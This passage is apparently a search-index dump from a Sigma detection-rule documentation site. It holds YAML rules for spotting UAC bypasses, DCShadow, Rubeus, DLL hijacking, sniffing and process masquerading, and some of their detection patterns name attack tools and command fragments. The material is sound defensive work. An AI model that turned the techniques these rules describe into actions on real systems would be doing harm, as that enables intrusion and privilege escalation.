\u0026#39;ANONYMOUS\u0026#39; - \u0026#39;LOGON\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_local_anon_logon_created.yml/","tags":["attack.persistence","attack.t1136.001","attack.t1136.002"],"title":"Suspicious Windows ANONYMOUS LOGON Local Account Created"},{"categories":null,"contents":"When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\nKnown false-positives Admin activity References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.001/T1546.001.md Raw rule (edit) title: Change Default File Association id: 3d3aa6cd-6272-44d6-8afc-7e88dfef7061 status: test description: When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened. author: Timur Zinniatullin, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.001/T1546.001.md date: 2019/10/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;cmd\u0026#39; - \u0026#39;/c\u0026#39; - \u0026#39;assoc\u0026#39; condition: selection fields: - Image - CommandLine - User - LogonGuid - Hashes - ParentProcessGuid - ParentCommandLine falsepositives: - Admin activity level: low tags: - attack.persistence - attack.t1546.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_change_default_file_association.yml/","tags":["attack.persistence","attack.t1546.001"],"title":"Change Default File Association"},{"categories":null,"contents":"Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\nKnown false-positives Legitimate administrator or user uses network sniffing tool for legitimate reasons. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1040/T1040.md Raw rule (edit) title: Network Sniffing id: f4d3748a-65d1-4806-bd23-e25728081d01 status: test description: Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data. author: Timur Zinniatullin, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1040/T1040.md date: 2019/10/21 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection1: type: \u0026#39;execve\u0026#39; a0: \u0026#39;tcpdump\u0026#39; a1: \u0026#39;-c\u0026#39; a3|contains: \u0026#39;-i\u0026#39; selection2: type: \u0026#39;execve\u0026#39; a0: \u0026#39;tshark\u0026#39; a1: \u0026#39;-c\u0026#39; a3: \u0026#39;-i\u0026#39; condition: selection1 or selection2 falsepositives: - Legitimate administrator or user uses network sniffing tool for legitimate reasons. level: low tags: - attack.credential_access - attack.discovery - attack.t1040 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_network_sniffing.yml/","tags":["attack.credential_access","attack.discovery","attack.t1040"],"title":"Network Sniffing"},{"categories":null,"contents":"Detects specific process parameters as seen in DTRACK infections\nKnown false-positives Unlikely References https://securelist.com/my-name-is-dtrack/93338/ https://app.any.run/tasks/4bc9860d-ab51-4077-9e09-59ad346b92fd/ https://app.any.run/tasks/ce4deab5-3263-494f-93e3-afb2b9d79f14/ Raw rule (edit) title: DTRACK Process Creation id: f1531fa4-5b84-4342-8f68-9cf3fdbd83d4 status: stable description: Detects specific process parameters as seen in DTRACK infections author: Florian Roth references: - https://securelist.com/my-name-is-dtrack/93338/ - https://app.any.run/tasks/4bc9860d-ab51-4077-9e09-59ad346b92fd/ - https://app.any.run/tasks/ce4deab5-3263-494f-93e3-afb2b9d79f14/ date: 2019/10/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39; echo EEEE \u0026gt; \u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: critical tags: - attack.impact - attack.t1490 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_malware_dtrack.yml/","tags":["attack.impact","attack.t1490"],"title":"DTRACK Process Creation"},{"categories":null,"contents":"Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.\nReferences https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md Raw rule (edit) title: Masquerading as Linux Crond Process id: 9d4548fa-bba0-4e88-bd66-5d5bf516cda0 status: test description: Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed. author: Timur Zinniatullin, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md date: 2019/10/21 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: \u0026#39;execve\u0026#39; a0: \u0026#39;cp\u0026#39; a1: \u0026#39;-i\u0026#39; a2: \u0026#39;/bin/sh\u0026#39; a3|endswith: \u0026#39;/crond\u0026#39; condition: selection level: medium tags: - attack.defense_evasion - attack.t1036.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_masquerading_crond.yml/","tags":["attack.defense_evasion","attack.t1036.003"],"title":"Masquerading as Linux Crond Process"},{"categories":null,"contents":"Detects manual service execution (start) via system utilities.\nKnown false-positives Legitimate administrator or user executes a service for legitimate reasons. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.md Raw rule (edit) title: Service Execution id: 2a072a96-a086-49fa-bcb5-15cc5a619093 status: test description: Detects manual service execution (start) via system utilities. author: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.md date: 2019/10/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\net.exe\u0026#39; - \u0026#39;\\net1.exe\u0026#39; CommandLine|contains: \u0026#39; start \u0026#39; # space character after the \u0026#39;start\u0026#39; keyword indicates that a service name follows, in contrast to `net start` discovery expression condition: selection falsepositives: - Legitimate administrator or user executes a service for legitimate reasons. level: low tags: - attack.execution - attack.t1569.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_service_execution.yml/","tags":["attack.execution","attack.t1569.002"],"title":"Service Execution"},{"categories":null,"contents":"Offensive tradecraft is switching away from using APIs like \u0026ldquo;CreateRemoteThread\u0026rdquo;, however, this is still largely observed in the wild. This rule aims to detect suspicious processes (those we would not expect to behave in this way like word.exe or outlook.exe) creating remote threads on other processes. It is a generalistic rule, but it should have a low FP ratio due to the selected range of processes.\nKnown false-positives Unknown References Personal research, statistical analysis https://lolbas-project.github.io Raw rule (edit) title: Suspicious Remote Thread Created id: 66d31e5f-52d6-40a4-9615-002d3789a119 description: Offensive tradecraft is switching away from using APIs like \u0026#34;CreateRemoteThread\u0026#34;, however, this is still largely observed in the wild. This rule aims to detect suspicious processes (those we would not expect to behave in this way like word.exe or outlook.exe) creating remote threads on other processes. It is a generalistic rule, but it should have a low FP ratio due to the selected range of processes. notes: - MonitoringHost.exe is a process that loads .NET CLR by default and thus a favorite for process injection for .NET in-memory offensive tools. status: experimental date: 2019/10/27 modified: 2021/06/27 author: Perez Diego (@darkquassar), oscd.community references: - Personal research, statistical analysis - https://lolbas-project.github.io logsource: product: windows category: create_remote_thread tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1055 detection: selection: SourceImage|endswith: - \u0026#39;\\bash.exe\u0026#39; - \u0026#39;\\cvtres.exe\u0026#39; - \u0026#39;\\defrag.exe\u0026#39; - \u0026#39;\\dnx.exe\u0026#39; - \u0026#39;\\esentutl.exe\u0026#39; - \u0026#39;\\excel.exe\u0026#39; - \u0026#39;\\expand.exe\u0026#39; - \u0026#39;\\explorer.exe\u0026#39; - \u0026#39;\\find.exe\u0026#39; - \u0026#39;\\findstr.exe\u0026#39; - \u0026#39;\\forfiles.exe\u0026#39; - \u0026#39;\\git.exe\u0026#39; - \u0026#39;\\gpupdate.exe\u0026#39; - \u0026#39;\\hh.exe\u0026#39; - \u0026#39;\\iexplore.exe\u0026#39; - \u0026#39;\\installutil.exe\u0026#39; - \u0026#39;\\lync.exe\u0026#39; - \u0026#39;\\makecab.exe\u0026#39; - \u0026#39;\\mDNSResponder.exe\u0026#39; - \u0026#39;\\monitoringhost.exe\u0026#39; - \u0026#39;\\msbuild.exe\u0026#39; - \u0026#39;\\mshta.exe\u0026#39; - \u0026#39;\\msiexec.exe\u0026#39; - \u0026#39;\\mspaint.exe\u0026#39; - \u0026#39;\\outlook.exe\u0026#39; - \u0026#39;\\ping.exe\u0026#39; - \u0026#39;\\powerpnt.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\provtool.exe\u0026#39; - \u0026#39;\\python.exe\u0026#39; - \u0026#39;\\regsvr32.exe\u0026#39; - \u0026#39;\\robocopy.exe\u0026#39; - \u0026#39;\\runonce.exe\u0026#39; - \u0026#39;\\sapcimc.exe\u0026#39; - \u0026#39;\\schtasks.exe\u0026#39; - \u0026#39;\\smartscreen.exe\u0026#39; - \u0026#39;\\spoolsv.exe\u0026#39; # - \u0026#39;\\taskhost.exe\u0026#39; # disabled due to false positives - \u0026#39;\\tstheme.exe\u0026#39; - \u0026#39;\\userinit.exe\u0026#39; - \u0026#39;\\vssadmin.exe\u0026#39; - \u0026#39;\\vssvc.exe\u0026#39; - \u0026#39;\\w3wp.exe\u0026#39; - \u0026#39;\\winlogon.exe\u0026#39; - \u0026#39;\\winscp.exe\u0026#39; - \u0026#39;\\wmic.exe\u0026#39; - \u0026#39;\\word.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; filter: SourceImage|contains: \u0026#39;Visual Studio\u0026#39; condition: selection and not filter fields: - ComputerName - User - SourceImage - TargetImage level: high falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/create_remote_thread/sysmon_suspicious_remote_thread.yml/","tags":["attack.privilege_escalation","attack.defense_evasion","attack.t1055"],"title":"Suspicious Remote Thread Created"},{"categories":null,"contents":"Detects possible bypass EDR and SIEM via abnormal user account name.\nKnown false-positives Unknown Raw rule (edit) title: New or Renamed User Account with \u0026#39;$\u0026#39; in Attribute \u0026#39;SamAccountName\u0026#39;. id: cfeed607-6aa4-4bbd-9627-b637deb723c8 status: experimental description: Detects possible bypass EDR and SIEM via abnormal user account name. tags: - attack.defense_evasion - attack.t1036 author: Ilyas Ochkov, oscd.community date: 2019/10/25 modified: 2021/07/07 logsource: product: windows service: security detection: selection: EventID: - 4720 # create user - 4781 # rename user SamAccountName|contains: \u0026#39;$\u0026#39; condition: selection fields: - EventID - SamAccountName - SubjectUserName falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_new_or_renamed_user_account_with_dollar_sign.yml/","tags":["attack.defense_evasion","attack.t1036"],"title":"New or Renamed User Account with '$' in Attribute 'SamAccountName'."},{"categories":null,"contents":"Detects DCShadow via create new SPN\nKnown false-positives Exclude known DCs References https://github.com/Neo23x0/sigma/blob/ec5bb710499caae6667c7f7311ca9e92c03b9039/rules/windows/builtin/win_dcsync.yml https://twitter.com/gentilkiwi/status/1003236624925413376 https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2 https://blog.alsid.eu/dcshadow-explained-4510f52fc19d Raw rule (edit) title: Possible DC Shadow id: 32e19d25-4aed-4860-a55a-be99cb0bf7ed description: Detects DCShadow via create new SPN status: experimental author: Ilyas Ochkov, oscd.community, Chakib Gzenayi (@Chak092), Hosni Mribah date: 2019/10/25 modified: 2021/07/06 references: - https://github.com/Neo23x0/sigma/blob/ec5bb710499caae6667c7f7311ca9e92c03b9039/rules/windows/builtin/win_dcsync.yml - https://twitter.com/gentilkiwi/status/1003236624925413376 - https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2 - https://blog.alsid.eu/dcshadow-explained-4510f52fc19d tags: - attack.credential_access - attack.t1207 logsource: product: windows service: security detection: selection1: EventID: 4742 ServicePrincipalNames|contains: \u0026#39;GC/\u0026#39; selection2: EventID: 5136 AttributeLDAPDisplayName: servicePrincipalName AttributeValue|startswith: \u0026#39;GC/\u0026#39; condition: selection1 or selection2 falsepositives: - Exclude known DCs level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_possible_dc_shadow.yml/","tags":["attack.credential_access","attack.t1207"],"title":"Possible DC Shadow"},{"categories":null,"contents":"Detects several different DNS-answers by one domain with IPs from internal and external networks. Normally, DNS-answer contain TTL \u0026gt;100. (DNS-record will saved in host cache for a while TTL).\nReferences https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325 Raw rule (edit) title: Possible DNS Rebinding id: eb07e747-2552-44cd-af36-b659ae0958e4 status: test description: Detects several different DNS-answers by one domain with IPs from internal and external networks. Normally, DNS-answer contain TTL \u0026gt;100. (DNS-record will saved in host cache for a while TTL). author: Ilyas Ochkov, oscd.community references: - https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325 date: 2019/10/25 modified: 2021/11/27 logsource: product: windows category: dns_query detection: dns_answer: QueryName: \u0026#39;*\u0026#39; QueryStatus: \u0026#39;0\u0026#39; filter_int_ip: QueryResults|startswith: - \u0026#39;(::ffff:)?10.\u0026#39; - \u0026#39;(::ffff:)?192.168.\u0026#39; - \u0026#39;(::ffff:)?172.16.\u0026#39; - \u0026#39;(::ffff:)?172.17.\u0026#39; - \u0026#39;(::ffff:)?172.18.\u0026#39; - \u0026#39;(::ffff:)?172.19.\u0026#39; - \u0026#39;(::ffff:)?172.20.\u0026#39; - \u0026#39;(::ffff:)?172.21.\u0026#39; - \u0026#39;(::ffff:)?172.22.\u0026#39; - \u0026#39;(::ffff:)?172.23.\u0026#39; - \u0026#39;(::ffff:)?172.24.\u0026#39; - \u0026#39;(::ffff:)?172.25.\u0026#39; - \u0026#39;(::ffff:)?172.26.\u0026#39; - \u0026#39;(::ffff:)?172.27.\u0026#39; - \u0026#39;(::ffff:)?172.28.\u0026#39; - \u0026#39;(::ffff:)?172.29.\u0026#39; - \u0026#39;(::ffff:)?172.30.\u0026#39; - \u0026#39;(::ffff:)?172.31.\u0026#39; - \u0026#39;(::ffff:)?127.\u0026#39; timeframe: 30s condition: (dns_answer and filter_int_ip) and (dns_answer and not filter_int_ip) | count(QueryName) by ComputerName \u0026gt; 3 level: medium tags: - attack.initial_access - attack.t1189 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/dns_query/dns_query_win_possible_dns_rebinding.yml/","tags":["attack.initial_access","attack.t1189"],"title":"Possible DNS Rebinding"},{"categories":null,"contents":"Detects potential use of Rubeus via registered new trusted logon process\nKnown false-positives Unknown References https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1 Raw rule (edit) title: Register new Logon Process by Rubeus id: 12e6d621-194f-4f59-90cc-1959e21e69f7 description: Detects potential use of Rubeus via registered new trusted logon process status: experimental references: - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1 tags: - attack.lateral_movement - attack.privilege_escalation - attack.t1558.003 author: Roberto Rodriguez (source), Ilyas Ochkov (rule), oscd.community date: 2019/10/24 modified: 2021/08/14 logsource: product: windows service: security detection: selection: EventID: 4611 LogonProcessName: \u0026#39;User32LogonProcesss\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_register_new_logon_process_by_rubeus.yml/","tags":["attack.lateral_movement","attack.privilege_escalation","attack.t1558.003"],"title":"Register new Logon Process by Rubeus"},{"categories":null,"contents":"Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.\nKnown false-positives Other browsers References https://github.com/GhostPack/Rubeus Raw rule (edit) title: Suspicious Outbound Kerberos Connection id: eca91c7c-9214-47b9-b4c5-cb1d7e4f2350 status: test description: Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation. author: Ilyas Ochkov, oscd.community references: - https://github.com/GhostPack/Rubeus date: 2019/10/24 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 5156 DestinationPort: 88 filter: Image|endswith: - \u0026#39;\\lsass.exe\u0026#39; - \u0026#39;\\opera.exe\u0026#39; - \u0026#39;\\chrome.exe\u0026#39; - \u0026#39;\\firefox.exe\u0026#39; condition: selection and not filter falsepositives: - Other browsers level: high tags: - attack.lateral_movement - attack.t1558.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_suspicious_outbound_kerberos_connection.yml/","tags":["attack.lateral_movement","attack.t1558.003"],"title":"Suspicious Outbound Kerberos Connection"},{"categories":null,"contents":"Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.\nKnown false-positives Other browsers References https://github.com/GhostPack/Rubeus Raw rule (edit) title: Suspicious Outbound Kerberos Connection id: e54979bd-c5f9-4d6c-967b-a04b19ac4c74 status: test description: Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation. author: Ilyas Ochkov, oscd.community references: - https://github.com/GhostPack/Rubeus date: 2019/10/24 modified: 2021/12/02 logsource: category: network_connection product: windows detection: selection: DestinationPort: 88 Initiated: \u0026#39;true\u0026#39; filter: Image|endswith: - \u0026#39;\\lsass.exe\u0026#39; - \u0026#39;\\opera.exe\u0026#39; - \u0026#39;\\chrome.exe\u0026#39; - \u0026#39;\\firefox.exe\u0026#39; - \u0026#39;\\tomcat\\bin\\tomcat8.exe\u0026#39; condition: selection and not filter falsepositives: - Other browsers level: high tags: - attack.credential_access - attack.t1558 - attack.lateral_movement - attack.t1550.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_suspicious_outbound_kerberos_connection.yml/","tags":["attack.credential_access","attack.t1558","attack.lateral_movement","attack.t1550.003"],"title":"Suspicious Outbound Kerberos Connection"},{"categories":null,"contents":"The \u0026lsquo;LsaRegisterLogonProcess\u0026rsquo; function verifies that the application making the function call is a logon process by checking that it has the SeTcbPrivilege privilege set. Possible Rubeus tries to get a handle to LSA.\nKnown false-positives Unknown References https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1 Raw rule (edit) title: User Couldn\u0026#39;t Call a Privileged Service \u0026#39;LsaRegisterLogonProcess\u0026#39; id: 6daac7fc-77d1-449a-a71a-e6b4d59a0e54 description: The \u0026#39;LsaRegisterLogonProcess\u0026#39; function verifies that the application making the function call is a logon process by checking that it has the SeTcbPrivilege privilege set. Possible Rubeus tries to get a handle to LSA. status: experimental references: - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1 tags: - attack.lateral_movement - attack.privilege_escalation - attack.t1558.003 author: Roberto Rodriguez (source), Ilyas Ochkov (rule), oscd.community date: 2019/10/24 modified: 2021/11/30 logsource: product: windows service: security detection: selection: Provider_Name: Microsoft-Windows-Security-Auditing EventID: 4673 Service: \u0026#39;LsaRegisterLogonProcess()\u0026#39; Keywords: \u0026#39;0x8010000000000000\u0026#39; #failure condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_user_couldnt_call_privileged_service_lsaregisterlogonprocess.yml/","tags":["attack.lateral_movement","attack.privilege_escalation","attack.t1558.003"],"title":"User Couldn't Call a Privileged Service 'LsaRegisterLogonProcess'"},{"categories":null,"contents":"IKEEXT and SessionEnv service, as they call LoadLibrary on files that do not exist within C:\\Windows\\System32\\ by default. An attacker can place their malicious logic within the PROCESS_ATTACH block of their library and restart the aforementioned services \u0026ldquo;svchost.exe -k netsvcs\u0026rdquo; to gain code execution on a remote machine.\nKnown false-positives Pentest References https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992 Raw rule (edit) title: Svchost DLL Search Order Hijack id: 602a1f13-c640-4d73-b053-be9a2fa58b77 status: test description: IKEEXT and SessionEnv service, as they call LoadLibrary on files that do not exist within C:\\Windows\\System32\\ by default. An attacker can place their malicious logic within the PROCESS_ATTACH block of their library and restart the aforementioned services \u0026#34;svchost.exe -k netsvcs\u0026#34; to gain code execution on a remote machine. author: SBousseaden references: - https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992 date: 2019/10/28 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - \u0026#39;\\svchost.exe\u0026#39; ImageLoaded|endswith: - \u0026#39;\\tsmsisrv.dll\u0026#39; - \u0026#39;\\tsvipsrv.dll\u0026#39; - \u0026#39;\\wlbsctrl.dll\u0026#39; filter: ImageLoaded|startswith: - \u0026#39;C:\\Windows\\WinSxS\\\u0026#39; condition: selection and not filter falsepositives: - Pentest level: high tags: - attack.persistence - attack.defense_evasion - attack.t1574.002 - attack.t1574.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_svchost_dll_search_order_hijack.yml/","tags":["attack.persistence","attack.defense_evasion","attack.t1574.002","attack.t1574.001"],"title":"Svchost DLL Search Order Hijack"},{"categories":null,"contents":"Detects audio capture via PowerShell Cmdlet.\nKnown false-positives Legitimate audio capture by legitimate user. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md https://eqllib.readthedocs.io/en/latest/analytics/ab7a6ef4-0983-4275-a4f1-5c6bd3c31c23.html Raw rule (edit) title: Audio Capture via PowerShell id: 932fb0d8-692b-4b0f-a26e-5643a50fe7d6 status: test description: Detects audio capture via PowerShell Cmdlet. author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md - https://eqllib.readthedocs.io/en/latest/analytics/ab7a6ef4-0983-4275-a4f1-5c6bd3c31c23.html date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39;WindowsAudioDevice-Powershell-Cmdlet\u0026#39; condition: selection falsepositives: - Legitimate audio capture by legitimate user. level: medium tags: - attack.collection - attack.t1123 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_audio_capture.yml/","tags":["attack.collection","attack.t1123"],"title":"Audio Capture via PowerShell"},{"categories":null,"contents":"Detect attacker collecting audio via SoundRecorder application.\nKnown false-positives Legitimate audio capture by legitimate user. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md https://eqllib.readthedocs.io/en/latest/analytics/f72a98cb-7b3d-4100-99c3-a138b6e9ff6e.html Raw rule (edit) title: Audio Capture via SoundRecorder id: 83865853-59aa-449e-9600-74b9d89a6d6e status: test description: Detect attacker collecting audio via SoundRecorder application. author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md - https://eqllib.readthedocs.io/en/latest/analytics/f72a98cb-7b3d-4100-99c3-a138b6e9ff6e.html date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\SoundRecorder.exe\u0026#39; CommandLine|contains: \u0026#39;/FILE\u0026#39; condition: selection falsepositives: - Legitimate audio capture by legitimate user. level: medium tags: - attack.collection - attack.t1123 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_soundrec_audio_capture.yml/","tags":["attack.collection","attack.t1123"],"title":"Audio Capture via SoundRecorder"},{"categories":null,"contents":"Detect child processes of automatically elevated instances of Microsoft Connection Manager Profile Installer (cmstp.exe).\nKnown false-positives Legitimate use of cmstp.exe utility by legitimate user References https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1191/T1191.md Raw rule (edit) title: Bypass UAC via CMSTP id: e66779cc-383e-4224-a3a4-267eeb585c40 status: test description: Detect child processes of automatically elevated instances of Microsoft Connection Manager Profile Installer (cmstp.exe). author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1191/T1191.md date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\cmstp.exe\u0026#39; CommandLine|contains: - \u0026#39;/s\u0026#39; - \u0026#39;/au\u0026#39; condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Legitimate use of cmstp.exe utility by legitimate user level: high tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1548.002 - attack.t1218.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_cmstp.yml/","tags":["attack.privilege_escalation","attack.defense_evasion","attack.t1548.002","attack.t1218.003"],"title":"Bypass UAC via CMSTP"},{"categories":null,"contents":"Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.\nKnown false-positives Legitimate use of fodhelper.exe utility by legitimate user References https://eqllib.readthedocs.io/en/latest/analytics/e491ce22-792f-11e9-8f5c-d46d6d62a49e.html https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1088/T1088.md Raw rule (edit) title: Bypass UAC via Fodhelper.exe id: 7f741dcf-fc22-4759-87b4-9ae8376676a2 status: test description: Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes. author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community references: - https://eqllib.readthedocs.io/en/latest/analytics/e491ce22-792f-11e9-8f5c-d46d6d62a49e.html - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1088/T1088.md date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\fodhelper.exe\u0026#39; condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Legitimate use of fodhelper.exe utility by legitimate user level: high tags: - attack.privilege_escalation - attack.t1548.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_fodhelper.yml/","tags":["attack.privilege_escalation","attack.t1548.002"],"title":"Bypass UAC via Fodhelper.exe"},{"categories":null,"contents":"Identifies use of WSReset.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.\nKnown false-positives Unknown References https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html Raw rule (edit) title: Bypass UAC via WSReset.exe id: d797268e-28a9-49a7-b9a8-2f5039011c5c status: test description: Identifies use of WSReset.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes. author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community references: - https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\wsreset.exe\u0026#39; filter: Image|endswith: \u0026#39;\\conhost.exe\u0026#39; condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1548.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_wsreset.yml/","tags":["attack.privilege_escalation","attack.t1548.002"],"title":"Bypass UAC via WSReset.exe"},{"categories":null,"contents":"Identifies usage of hh.exe executing recently modified .chm files.\nKnown false-positives unlike References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md https://eqllib.readthedocs.io/en/latest/analytics/b25aa548-7937-11e9-8f5c-d46d6d62a49e.html Raw rule (edit) title: HH.exe Execution id: 68c8acb4-1b60-4890-8e82-3ddf7a6dba84 status: test description: Identifies usage of hh.exe executing recently modified .chm files. author: E.M. Anhaus (originally from Atomic Blue Detections, Dan Beavin), oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md - https://eqllib.readthedocs.io/en/latest/analytics/b25aa548-7937-11e9-8f5c-d46d6d62a49e.html date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\hh.exe\u0026#39; CommandLine|contains: \u0026#39;.chm\u0026#39; condition: selection fields: - ComputerName - User - CommandLine falsepositives: - unlike level: high tags: - attack.defense_evasion - attack.t1218.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_hh_chm.yml/","tags":["attack.defense_evasion","attack.t1218.001"],"title":"HH.exe Execution"},{"categories":null,"contents":"Detect indirect command execution via Program Compatibility Assistant (pcalua.exe or forfiles.exe).\nKnown false-positives Need to use extra processing with \u0026lsquo;unique_count\u0026rsquo; / \u0026lsquo;filter\u0026rsquo; to focus on outliers as opposed to commonly seen artifacts. Legitimate usage of scripts. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1202/T1202.md https://eqllib.readthedocs.io/en/latest/analytics/884a7ccd-7305-4130-82d0-d4f90bc118b6.html Raw rule (edit) title: Indirect Command Execution id: 